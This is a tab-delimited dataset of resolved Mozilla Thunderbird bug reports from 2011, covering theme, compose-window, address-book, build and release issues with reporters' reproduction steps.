692100%TAB%1317791566%TAB%419931%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Theme%TAB%menubar is extremely difficult to read with aero-glass effect%TAB%menubar is extremely difficult to read with aero-glass effectUser Agent: Mozilla/5.0 (Windows NT 5.1; rv:8.0) Gecko/20100101 Firefox/8.0 Build ID: 20110928060149  Steps to reproduce:  Install Thunderbird using the standard theme   Actual results:  I couldn't read the Menu bar unless I looked really hard   Expected results:  The menubar should be of sufficiently high contrast to be easy to read Bug 667248 raised the subject that this menubar was impossible to read. It is no longer *IMPOSSIBLE*, but it is still very difficult, on my Vista box at least. That bug has been marked as FIXED, so I've opened this one as the basic product is unusable for me without an addon.   I don't know about Windows 7, but the problem is entirely absent on XP.   Interestingly, it's not as bad when the window isn't maximised, as the background changes colour (no, I don't know why, I think it's a Windows 'feature')  The problem is also present in Firefox, though that doesn't bother me as I use the Firefox button instead of the menu bar.
691748%TAB%1317705870%TAB%112088%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%General%TAB%Enable privacy policy link on Thunderbird's about dialog%TAB%Enable privacy policy link on Thunderbird's about dialogWe'll soon have a privacy policy posted for Thunderbird. We need to unhide the link on the about dialog and update the link itself to point to the new location once it is up.  The new link is:  http://www.mozilla.org/en-US/thunderbird/legal/privacy/
691730%TAB%1317700603%TAB%290185%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Theme%TAB%toolbar buttons and global search box are different height%TAB%toolbar buttons and global search box are different heightI've changed the min-height from 22px to 24px and gave a top and bottom margin of 1px instead of 2px to avoid a growing of the toolbar. I made the same change to the Quick Filter search box to have the same height of the search boxes.
691724%TAB%1317698200%TAB%290185%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Theme%TAB%The folder view tree aligns with nothing%TAB%The folder view tree aligns with nothing(this might be a bit nit-picky, but whatever) File explorer and Windows Media Player seems to do this a bit different, but both do slightly better alignment than the folder sidebar in Thunderbird currently does. Either we can move the children a couple of pixels to the left and make the expanders align with the parents (like explorer, alt1), or move them a couple of pixels to the right and make the childrens icons align with the parents texts (like media player alt2).
691066%TAB%1317456885%TAB%384947%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Testing Infrastructure%TAB%Check .asc file permissions prior to Thunderbird release%TAB%Check .asc file permissions prior to Thunderbird releaseBug 691025 - "GPG detached signatures (asc) missing for thunderbird 7.0.1" has cropped up a number of times. Releng have updated their documentation to run the 'fix-permissions' target but it got missed for 7.0.1.  Can QA please add file permission checks to the list of things to test prior to release?  Thanks.
691025%TAB%1317436361%TAB%302197%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%General%TAB%GPG detached signatures (asc) missing for thunderbird 7.0.1%TAB%GPG detached signatures (asc) missing for thunderbird 7.0.1User Agent: Mozilla/5.0 (X11; Linux i686; rv:7.0) Gecko/20100101 Firefox/7.0 Build ID: 20110922153450  Steps to reproduce:  Tried to verify the integrity and authenticity of thunderbird 7.0.1 release tarball This bug is similar to: 690730, 690721, 684434, 684369, 684480   Actual results:  Missing detachted signature file at least here: ftp://releases.mozilla.org/pub/mozilla.org/thunderbird/releases/latest/linux-i686/de/   Expected results:  There should be a detached signature file to allow verification of the integrity and authenticity of thunderbird 7.0.1
690761%TAB%1317359004%TAB%403756%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Address Book%TAB%Switch nsIAbManager::convertQueryStringToExpression aQueryString parameter to nsAUTF8String%TAB%Switch nsIAbManager::convertQueryStringToExpression aQueryString parameter to nsAUTF8StringnsIAbManager::convertQueryStringToExpression parameter "aQueryString" is currently typed as a string.  We should be using nsAUTF8String instead, to support non-ASCII search queries from Javascript.
690655%TAB%1317325946%TAB%199031%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Account Manager,Address Book%TAB%I cannot re-edit vCard using the previous values%TAB%I cannot re-edit vCard using the previous valuesUser Agent: Mozilla/5.0 (Windows NT 6.0; rv:7.0) Gecko/20100101 Firefox/7.0 Build ID: 20110922153450  Steps to reproduce:  (I uses the Japanese-localized version of Thunderbird so UI terms may be incorrect.)  1) I checked to attach vCard in an account and edit my vCard. 2) I mailed to my self to see if my vCard looks good. 3) I opened the account setting and attempted to edit my vCard again.   Actual results:  First time edited vCard was sent with my test message, but when I tried to edit my vCard again, the editor dialog is all blank.  It seems that the program cannot retrieve the previous values from my vCard.   Expected results:  When I try to edit my vCard, the editor should be filled with the previously entered values.
690526%TAB%1317296871%TAB%94%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Message Compose Window%TAB%address list won't resize smaller once made bigger,Compose window address list won't resize smaller once made bigger%TAB%address list won't resize smaller once made bigger,Compose window address list won't resize smaller once made biggerPut several addresses into your compose window. Resize the address list:  http://imgur.com/92faF  Now try to resize it smaller:  http://imgur.com/c6lsc  This seems to be a permanent state for the compose window now.
690522%TAB%1317296603%TAB%419113%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%General,Address Book%TAB%I tried to compose an email as I always do with one of my email distribution lists in my Address Book and when I highlight the list and click WRITE, nothing happens%TAB%I tried to compose an email as I always do with one of my email distribution lists in my Address Book and when I highlight the list and click WRITE, nothing happensUser Agent: Mozilla/5.0 (Windows NT 6.1; rv:6.0.2) Gecko/20100101 Firefox/6.0.2 Build ID: 20110902133214  Steps to reproduce:  I tried to compose an email as I always do with one of my email distribution lists in my Address Book and when I highlight the list and click WRITE, nothing happens - it should launch a blank composition window consisting of all the emails that comprise that list. After the latest update, this is not working.  Can someone please check this out.  Thank you,  Lou   Actual results:  nothing happens - it should launch a blank composition window consisting of all the emails that comprise that list. After the latest update, this is not working.   Expected results:  it should launch a blank composition window consisting of all the emails that comprise that list. After the latest update, this is not working.
690520%TAB%1317296547%TAB%4410%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Testing Infrastructure%TAB%plugin crash mozmill test should handle crash-reporter not being enabled%TAB%plugin crash mozmill test should handle crash-reporter not being enabledIn the no good deed goes unpunished category(mconley writing mozmill tests for plugin crashes), I have the following issue: in debug builds (or, rather, any non-official build), crash-reporter is disabled, which makes the new plugin tests fail. I often (ok, sometimes) run the mozmill tests on a debug build, and it would be helpful if I didn't have to help those tests along by clicking on the crash dialog
690319%TAB%1317265713%TAB%112088%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Mail Window Front End%TAB%Random orange: TEST-UNEXPECTED-FAIL | test-summarization.js | test_summarization_thread_detection (preceded by something like "Thought we would find row 0 at 92,-9 but we found -1")%TAB%Random orange: TEST-UNEXPECTED-FAIL | test-summarization.js | test_summarization_thread_detection (preceded by something like "Thought we would find row 0 at 92,-9 but we found -1")New random orange that has appeared in the last day or so:  Test Failure: Thought we would find row 0 at 92,-9 but we found -1 TEST-UNEXPECTED-FAIL | /buildbot/comm-central-linux-opt-unittest-mozmill/build/mozmill/folder-display/test-summarization.js | test_summarization_thread_detection  http://tinderbox.mozilla.org/showlog.cgi?log=ThunderbirdTrunk/1317293922.1317295330.14004.gz#err0  Seems pretty frequent, only on Linux so far.
690316%TAB%1317265000%TAB%112088%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%General%TAB%Disable the what's new tab for users updating to minor/security release versions%TAB%Disable the what's new tab for users updating to minor/security release versionsBased on what we're doing in bug 690290, I think we should have code in place not to show the what's new tab for security/minor releases, and only show it for major releases where things are actually changing.  So for users updating, the map would go like follows. Assuming a 7.0.2 release is coming out:  * 6.0 -> 7.0.2 get prompted (this would be the page for the 7.0 release, set up by redirects). * 7.0 -> 7.0.2 don't get prompted. * 7.0.1 -> 7.0.2 don't get prompted.  Rafael: are you happy with this? If we find we need it for some reason, we can always back the code out for that release.  Note that Firefox is working on a way to cover what happens at update via the update snippets that AUS sends out. They've not quite finished yet, and it'll be a few versions before we get there, so I'd like to do this as a stop-gap.
690290%TAB%1317257820%TAB%112088%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%General%TAB%Disable the what's new tab for users updating from 7.0 to 7.0.1%TAB%Disable the what's new tab for users updating from 7.0 to 7.0.1As 7.0 -> 7.0.1 is a small bug-fix update, there isn't really any reason to show the what's new page. We should however show it for 6.0.2 -> 7.0.1 users.  The attached patch is a quick fix based on a patch by irving that achieves this. It will only land for comm-release.  For future versions I'm going to propose that we make this more permanent and we'll do that in a separate bug.
690282%TAB%1317256289%TAB%373850%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Message Compose Window%TAB%Caret vanishes when dropping attachment into mail edit window%TAB%Caret vanishes when dropping attachment into mail edit windowUser Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SBS; .NET CLR 1.0.3705; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; InfoPath.1; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MS-RTC LM 8; .NET4.0C; .NET4.0E; SBS)  Steps to reproduce:  ALT-TAB to a Windows Explorer window, click on a file, keep mouse button down, ALT-TAB to the TB Compose Window, dropped the file (thus attached it to my mail), then click in the mail composition window.   Actual results:  The caret does not appear in the compose window. I can still write. Doing ALT-TAB and then again ALT-TAB (= switching task away and back) solves the problem.   Expected results:  The caret should not have vanished.
690277%TAB%1317255766%TAB%425950%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%General,Preferences%TAB%Multiple Address Book Entry In Junk Mail Property,Multiple (duplicate) Address Book Entries In "do not mark mail as junk if the sender is in" (Account settings -> Junk settings),Multiple (duplicate) Address Book Entries / checkboxes in "do not mark mail as junk if the sender is in" (Account settings -> Junk settings)%TAB%Multiple Address Book Entry In Junk Mail Property,Multiple (duplicate) Address Book Entries In "do not mark mail as junk if the sender is in" (Account settings -> Junk settings),Multiple (duplicate) Address Book Entries / checkboxes in "do not mark mail as junk if the sender is in" (Account settings -> Junk settings)User Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:7.0) Gecko/20100101 Firefox/7.0 Build ID: 20110922153450  Steps to reproduce:  Find multiple alternate entries of "personal address book" and "collected addresses" in junk mail property on profile with two email accounts. Originally 12 entries.    Actual results:  Unchecking all boxes reverts to normal display. Rechecking them gives number of entries for the accounts in that profile. ie if I create two dummy email accounts I will see 8 entries in the property sheet. This increased in sequence for each email account setting you view. ie, look at the first account there are the normal two entries, personal and collected, then second one you see four, third one six etc..   Expected results:  Only personal and collected for the relevant email should be visible on its property sheet available for junk mail filtering
690267%TAB%1317251695%TAB%112088%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%Message Compose Window%TAB%Insert|Insert Characters and symbols not working - no options in drop-downs.%TAB%Insert|Insert Characters and symbols not working - no options in drop-downs.If you go to the compose window, and select Insert -> Characters and Symbols then you'll find that the drop-down boxes have no symbols in them.  This appears to be a regression in 7.  A quick look at the error console reveals:  Error: malformed Unicode character escape sequence Source File: chrome://editor/content/EdInsertChars.js Line: 416, Column: 2 Source Code:   "\u00f2\u00f3\u00f4\u00f5\u00f6\u014d\u014f\u0151\u01d2\u01eb\u01ed\u020d\u020e\u022b\u22d\u022f\u0231\u1e4d\u1e4f\u1e51\u1e53\u1ecd\u1ecf\u1ed1\u1ed3\u1ed5\u1ed7\u1ed9\u1edb\u1edd\u1edf\u1ee1\u1ee3",   The "\u22d" bit seems to be the error - even my emacs picks that up as wrong. My guess is that something has got a bit stricter in 7, causing this to now be an error.
690080%TAB%1317212101%TAB%190375%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Theme%TAB%Tab focus ring enlarges tab%TAB%Tab focus ring enlarges tabStarting with Thunderbird 5 I think, focus rings are shown on tabs labels. As soon as the ring is drawn, the tab grows by 1-2 pixels (vertically). This should be fixed or the focus ring be removed (Firefox does not shoe focus rings on tabs)
689950%TAB%1317190012%TAB%425826%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Message Reader UI%TAB%RSS attachments can't be downloaded%TAB%RSS attachments can't be downloadedThe "Save" button for RSS attachments is disabled, preventing the user from downloading them. Right-clicking on the attachment itself opens the context menu, but the "Open" and "Save" options are grayed out.  I tried opening Thunderbird in safe mode, and this bug persists, so it doesn't seem to be an add-on issue. I have the feed message view set to Original HTML and Summary. Changing these didn't help either.
689742%TAB%1317126533%TAB%94%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Preferences%TAB%Set layers.acceleration.disabled to true,Disable hardware acceleration in Thunderbird%TAB%Set layers.acceleration.disabled to true,Disable hardware acceleration in ThunderbirdRight now Thunderbird forces the use of the discrete GPU because it uses layers acceleration. OpenGL layers acceleration is probably of minimal utility on Thunderbird, and so it should be disabled.
689555%TAB%1317098965%TAB%403756%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Build Config%TAB%Fix build bustage due to mozilla-central landing bug 687766 (kill binary xpidl)%TAB%Fix build bustage due to mozilla-central landing bug 687766 (kill binary xpidl)Bug 687766 landed in mozilla-central today (https://hg.mozilla.org/mozilla-central/rev/587115c590ff), and broke Thunderbird builds:   mconley@mconley-VirtualBox:/media/Projects/mozilla/thunderbird$ make -f client.mk Adding client.mk options from :     MOZ_OBJDIR=$(TOPSRCDIR)/../objdir-thunderbird-default     MOZ_MAKE_FLAGS=-j2 Generating /media/Projects/mozilla/thunderbird/configure using autoconf cd /media/Projects/mozilla/thunderbird; /usr/bin/autoconf2.13 /usr/bin/m4:./aclocal.m4:7: cannot open `mozilla/build/autoconf/libIDL.m4': No such file or directory make: *** [/media/Projects/mozilla/thunderbird/configure] Error 2  I was able to fix this locally by removing the dependency on libIDL.m4.
689543%TAB%1317095131%TAB%290185%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Theme%TAB%Alignment in message thread pane is off%TAB%Alignment in message thread pane is offFrom the Department of Alignment and Agriculture. The alignment between the text in the tree headers and tree cells are a bit off. This mockup shows the Linux theme, but the issue is present in the Windows and Mac themes as well.
689104%TAB%1316991031%TAB%112088%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Installer%TAB%Remove (Safe Mode) string since it is no longer used%TAB%Remove (Safe Mode) string since it is no longer usedWe didn't spot we needed to remove this bug 641784, and I've just spotted a bug that says we should do.
689015%TAB%1316901753%TAB%282357%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Theme%TAB%reply icon (hdrReplyOnlyButton)  in message header is blurry%TAB%reply icon (hdrReplyOnlyButton)  in message header is blurryHm, it looks like the same thing is happening here with the reply button (hdrReplyOnlyButton).
688991%TAB%1316858061%TAB%98534%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%Message Compose Window%TAB%Plaintext part not sent for multipart alternatve sen option,Plaintext part not sent for multipart alternatve send option%TAB%Plaintext part not sent for multipart alternatve sen option,Plaintext part not sent for multipart alternatve send optionSteps: Compose or reply to a message in html mode Select Options>>Format>>Plain& Rich text to avoid any internal AB decisions. Send or save the message locally and observe the result  Results: Two copies of the html message are sent even though multipart/alternative is indicated in the header.  This happens in:  Mozilla/5.0 (Windows NT 5.0; rv:9.0a1) Gecko/20110923 Thunderbird/9.0a1 ID:20110923030159 Not seen in the 20110920 build.  I strongly suspect bug 679476 as the problem
688860%TAB%1316777833%TAB%162223%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Message Compose Window%TAB%Cannot switch spell check language with multiple compose windows open%TAB%Cannot switch spell check language with multiple compose windows openIn investigating bug 687319 I found this.  Steps to reproduce: 1. Have two dictionaries installed, for example the built in en-US plus https://addons.mozilla.org/da/firefox/addon/dansk-ordbog/ 2. Have two compose windows open 3. Switch focus between the main editing area of the two windows a couple of times 4. Try to switch between dictionaries a couple of times  Expected result: Selected language changes Actual result: Selected language gets stuck  Possibly related to bug 338427 and/or bug 591780.
688169%TAB%1316587810%TAB%420324%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Mail Window Front End%TAB%First Run message is never displayed%TAB%First Run message is never displayedTB has support for a special "first run" welcome page, displayed in the mail message window the first time a new installation (or a new profile) starts up.  The logic to display this page never triggers. In msgMail3PaneWindow.js/OnLoadMessenger() we call LoadPostAccountWizard() which sets a timer on the "window" object to call loadStartFolder(). Then we call specialTabs.openSpecialTabsOnStartup(), which calls getApplicationUpgradeVersions() to check the old value of the "mailnews.start_page_override.mstone" pref **and set it to the current TB version**.  Then, later, the timer calls loadStartFolder() and a very twisty call chain gets to mailWindow.js/loadStartPage(), which checks the "...mstone" pref, sees it is already set, and always chooses to display the Start page instead of the Firstrun page.  Short term fix, as advised by Standard8, is to rip out the "first run" logic and page.  If we decide later that we really want a different UX on first run, I recommend that we pull out the "what is the old and new TB version, is this an upgrade or a first run" logic into a separate thing (object, group of methods on some existing object, whatever) that caches the test result, and call it from all the places that care; that way we won't be sensitive to subtle execution order changes.
687836%TAB%1316497091%TAB%339434%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Toolbars and Tabs%TAB%Bug-fixing pre-followup patch.%TAB%Bug-fixing pre-followup patch.STR: Apply the patches for bug 582801, bug 667244, and bug 670304 (in that order). Build Thunderbird. See what's still wrong.  ;)  The purpose of this bug is to fix all the little things I find wrong with those other patches, since it seems like a real pain to try and untangle what bits each patch is responsible for, and where each individual fix goes.  None of the patches in those bugs should be checked in until this patch is ready as well, and then we can do them all in one big swoop.
687526%TAB%1316420879%TAB%290185%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Folder and Message Lists%TAB%Missing archive icon%TAB%Missing archive iconIt seems the message folder icon got lost under Aero when we fixed bug #630330 This bug wants to fix that.
687520%TAB%1316420168%TAB%274627%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Preferences%TAB%Add DSPAM to "Trust junk mail headers set by" Option%TAB%Add DSPAM to "Trust junk mail headers set by" OptionAt current the "Trust junk mail headers set by" dropdown in the per-account junk mail settings only contains SpamAssassin and SpamPal.  I would like it to also contain DSPAM.
687369%TAB%1316342500%TAB%290185%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Theme%TAB%archive icon in message header is blurry%TAB%archive icon in message header is blurryThe archive icon is blurry. This does not happen in the header that's shown if several messages are selected.
686959%TAB%1316088081%TAB%4410%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Theme%TAB%multiple selection colors confusing on windows theme,improve multiple selection colors on windows theme; fix focused vs. unfocused selection colors%TAB%multiple selection colors confusing on windows theme,improve multiple selection colors on windows theme; fix focused vs. unfocused selection colorsIf I have two messages selected, the thread pane lines have very different colors - the one with focus is much darker, so it can be unclear that both messages are selected. Blake suggested making the colors closer, or even, the same.
686436%TAB%1315877293%TAB%273994%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Toolbars and Tabs,Help Documentation%TAB%ctrl tab,ctrl+tab, ctrl+shift+tab for switching tabs missing from TB keyboard shortcuts documentation%TAB%ctrl tab,ctrl+tab, ctrl+shift+tab for switching tabs missing from TB keyboard shortcuts documentationDocumentation is missing for ctrl+[shift]+tab on TB's list of keyboard shortcuts (http://support.mozillamessaging.com/en-US/kb/Keyboard-shortcuts)  Suppose we should have:  Switch to next tab [ctrl]+[tab] Switch to previous tab [ctrl]+[shift]+[tab]
686347%TAB%1315826075%TAB%206599%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Mail Window Front End,User Interface,Mail Window Front End%TAB%Get an account implementation tracker%TAB%Get an account implementation trackerThis is bug is for tracking my progress on landing get an account in the main product.  Here's a preliminary patch that doesn't do much, except for getting the right files into the tree, writing the right manifests, Makefiles, and that sort of stuff. Also, getting rid of the overlays, and doing the right tweaks instead of monkey-patching all sorts of stuff.  Per the phone discussion with JB, here's a list of things that we should watch for. 1. Interaction with opensearch (what happens if the user has made a search engine his favorite choice through opensearch, and he then gets an account through one of our add-supported partners?). 2. Make sure the list of providers is stored remotely so that we can add new partners without having to deploy a new version of Thunderbird (Blake, I believe this is in place already, can you confirm this?). 3. Make sure the API for creating an account (i.e. the remote API) is well-defined. Apparently, this is not the case for Yahoo. 4. Another item related to configuring specific email accounts which I wrote down, but I'm not sure what this is supposed to refer to. Jb, thoughts?  I'll be mainly posting updates for the patch, and pinging Blake and maybe Andreas for design decisions, appearance stuff, etc.  Blake, here's some questions for you. - why did you rewrite the new ComposeMessage function? there doesn't seem to be anything specific in it, - I'm not sure I understand what you wanted to overlay with mailWizardOverlay.xul, - hopefully I didn't miss any place where one can create a new account.  Let me know if you have any thoughts / comments, here would be a great place to keep them.
686129%TAB%1315638075%TAB%306754%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Testing Infrastructure%TAB%Random orange: TEST-UNEXPECTED-FAIL | /builds/slave/comm-central-macosx64-opt-unittest-mozmill/build/mozmill/migration-from-tb2/test-1-introduction.js | test_open_and_close_migration_assistant and other related failures,Random orange: TEST-UNEXPECTED-FAIL | test-1-introduction.js | test_open_and_close_migration_assistant and other related failures%TAB%Random orange: TEST-UNEXPECTED-FAIL | /builds/slave/comm-central-macosx64-opt-unittest-mozmill/build/mozmill/migration-from-tb2/test-1-introduction.js | test_open_and_close_migration_assistant and other related failures,Random orange: TEST-UNEXPECTED-FAIL | test-1-introduction.js | test_open_and_close_migration_assistant and other related failuresAttaching what I think is a fix for the issue. It's a departure from our usual way of wait-then-verify, but I think it's appropriate in this case. I've unified all the code that waits for either a content tab or a frame to load as far as I could.
685462%TAB%1315437597%TAB%155325%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%General%TAB%blanks at the end of email-address in Settings prevents displaying of inline images%TAB%blanks at the end of email-address in Settings prevents displaying of inline imagesUser Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; it; rv:1.9.2.21) Gecko/20110830 Firefox/3.6.21 Build ID: 20110830092825  Steps to reproduce:  - in Account settings, put a email-address with a blank at the end - try to use a signature with images or insert an inline images   Actual results:  - the images are not displayed   Expected results:  - the images should be displayed  This bug is caused by a wrong "cid" in the images.  In the body of message the "cid" reports the final blank as "%20" or doesn't report it (I got both behaviour in different PC) while the attachment mantains the final blank in the Content-Id. In both cases the images will not be displayed.  Probably the best way to fix it, is to strip all spaces in generating the "Content-Id".
685437%TAB%1315433103%TAB%352169%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Message Compose Window%TAB%Attachment pane width in composer is not consistent%TAB%Attachment pane width in composer is not consistentWhen you add an attachment to a message and then remove it, the width of the attachment pane shrinks a bit. This is from bug 630759, and the fix should be easy.
685345%TAB%1315403820%TAB%23131%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Address Book%TAB%Stop using abDirTreeOverlay%TAB%Stop using abDirTreeOverlayIn bug 677859, SeaMonkey stopped using abDirTreeOverlay.xul, so it should now really be removed from comm-central.  This patch: * Removes overlaying in abContactsPanel.xul * Removes abDirTreeOverlay.xul/dtd files. * Removes references to abDirTreeOverlay.xul/files from jar.mn files.
685166%TAB%1315376487%TAB%112088%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Release Engineering,Build Config%TAB%Port the work to enable mozconfigs to live in the source tree%TAB%Port the work to enable mozconfigs to live in the source treeFirefox have been working on putting their mozconfigs in the source tree. This will make it simpler at merge time, as any differences from central to aurora (for example) will just be automatically merged across, and we won't need to do a separate analysis in the build-config repository for what needs to be merged across mozconfigs.
684865%TAB%1315290583%TAB%120380%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Mail Window Front End%TAB%When receiving a new email, the notification doesn't display the email address of the sender when he has no name%TAB%When receiving a new email, the notification doesn't display the email address of the sender when he has no nameSome users didn't set their real name when sending an email, so only their email address is displayed in the From: field, i.e.    foo@bar.com  instead of    Mr Foo <foo@bar.com>  When such emails arrive in the inbox, the notification which popup doesn't mention who sent the email. All we see is "... from " at the end of the message. If no name is set, then it should fallback to "... from foo@bar.com" so that we can at a glance see who sent the email and decide if it should be read immediately or can wait a bit while doing some other work.
684508%TAB%1315032638%TAB%121364%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Message Compose Window%TAB%Line breaks in internet-cited text break UTF-8 quoted-printable characters%TAB%Line breaks in internet-cited text break UTF-8 quoted-printable charactersUser-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.16) Gecko/20101125 Thunderbird/3.0.11  In a non-HTML reply to a message containing long lines with non-ASCII characters the internet-cited (>) line of the original text has a newline splitting UTF-8 quoted-printable characters in two.  This results in two illegal characters appearing in the mail message body.  In Thunderbird these appear with a question mark (?).  When Apple Mail displays such a message it fails to decode its contents as UTF-8 displaying it as gibberish.  Reproducible: Always  Steps to Reproduce: 1. Create a plain-text UTF-8 encoded message containing a line of 1000 non-ASCII characters (e.g. αααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααα) 2. Send message to yourself 3. Reply to the message 4. Examine the sent message in the sent folder or the Outbox 5. The message will contain lines like the following > ααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααα� �α   Here is one line of the problematic internet-cited message, with the problem marked with "<------- ERROR"  > =CE=B1=CE=B1=CE=B1=CE=B1=CE=B1=CE=B1=CE=B1=CE=B1=CE=B1=CE=B1=CE=B1=CE=B1=
684453%TAB%1315000195%TAB%131213%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Migration%TAB%Some unused variables in Migrate method%TAB%Some unused variables in Migrate methodShould be removed.
684376%TAB%1314970897%TAB%299163%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Mail Window Front End,Theme%TAB%[Message header]: Make the tango orange more eye-friendly (and a gradient)%TAB%[Message header]: Make the tango orange more eye-friendly (and a gradient)The current tango orange is not very eye-friendly and doesn't look so nice in the new header. So, make it better.
684302%TAB%1314955696%TAB%72685%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Mail Window Front End,Theme%TAB%Quick Filter Read Icon Different From Read Column Icon%TAB%Quick Filter Read Icon Different From Read Column IconUser Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:9.0a1) Gecko/20110901 Firefox/9.0a1 Build ID: 20110901030807  Steps to reproduce:  The read icon on the quick filter bar and the read icon on the column heading are not the same.    Expected results:  The two icons should be the same.
683460%TAB%1314753852%TAB%38228%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%General%TAB%update won't allow Thunderbird 3.1.13%TAB%update won't allow Thunderbird 3.1.13User Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:6.0.1) Gecko/20100101 Firefox/6.0.1 Build ID: 20110830092941  Steps to reproduce:  Thunderbird 3.1.12  Under the administrator account, selected Help -> Check for Updates.   Actual results:  Big fancy splashy dialog asking whether I want to update to 6.0.  None of the 3 options were for TB 3.1.13.   Expected results:  The update must be to 3.1.13. TB 6.0 destroyed my .msf index files. See Bug 682588. Also Bug 682721 nee Bug 682731 et seq.  The Mozilla Foundation Security Advisory 2011-34 indicates that Thunderbird 3.1.13 fixes the problem: https://www.mozilla.org/security/announce/2011/mfsa2011-34.html  Bug 682927 indicates the problem is fixed in the common core product, but doesn't mention TB 3.1.13.
683405%TAB%1314721159%TAB%389997%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Account Manager%TAB%Unable to sync folders%TAB%Unable to sync foldersWe were able sync the account to Thunderbird and view everything in the inbox, but the folders didn't sync over.
683178%TAB%1314687912%TAB%253233%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Build Config%TAB%Port bug 673556 to comm-central%TAB%Port bug 673556 to comm-centralrs=Standard8 via irc. Pushed to comm-central rev efc02fae47a9
683093%TAB%1314652739%TAB%298458%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%OS Integration%TAB%Drag Attachments to a Finder-Window isnt working%TAB%Drag Attachments to a Finder-Window isnt workingUser Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_1) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.835.109 Safari/535.1  Steps to reproduce:  I drag an Attachment from the "preview"-section to a MacOS X 10.7.1-Finder-Window.   Actual results:  I drag an Attachment from the "preview"-section to a MacOS X 10.7.1-Finder-Window. Instead of the right file, I get a file called "undefined". The filesize is of "undefined" is exactly the right size of the droped file.   If i look with text-wrangler into the file, the data are the requested. TB doesnt name the dragged file correctly.   Expected results:  The file appears in the finder-window, but the filename isnt given correctly.
